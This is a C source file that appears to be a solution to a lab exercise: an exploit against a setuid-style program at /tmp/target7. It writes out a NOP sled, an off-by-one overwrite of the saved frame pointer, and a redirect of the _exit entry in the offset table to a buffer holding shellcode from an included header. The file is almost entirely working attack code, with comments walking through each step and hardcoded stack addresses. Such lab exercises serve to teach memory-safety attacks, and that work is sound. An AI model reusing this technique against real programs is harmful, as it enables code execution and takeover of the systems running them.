#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target7"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  args[2] = NULL;
  // overwrite by one byte
  args[1] = malloc(202);
  
  // fillers and null terminator like usual
  memset(args[1], 0x90, 201);
  * (unsigned int *)(args[1] + 201) = 0x00;

  // overwrite bar's ebp, redirect bar's frame to itself
  // bar's ebp = 0xbffffdb8 at 0xbffffd98. change its value to 0xbffffd98
  * (unsigned int *)(args[1] + 200) = 0x98;
  
  // p now is last 4 bytes of buf, and a is second last 4 bytes
  // *p = a: change the _exit address in offset table to buf's address
  // so instead of calling _exit(), it will run the buf
  * (unsigned int *)(args[1] + 196) = 0x08049724; // _exit address
  * (unsigned int *)(args[1] + 192) = 0xbffffcd0; // buf's address

  // shellcode at beginning of buf
  memcpy(args[1], shellcode, strlen(shellcode));
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
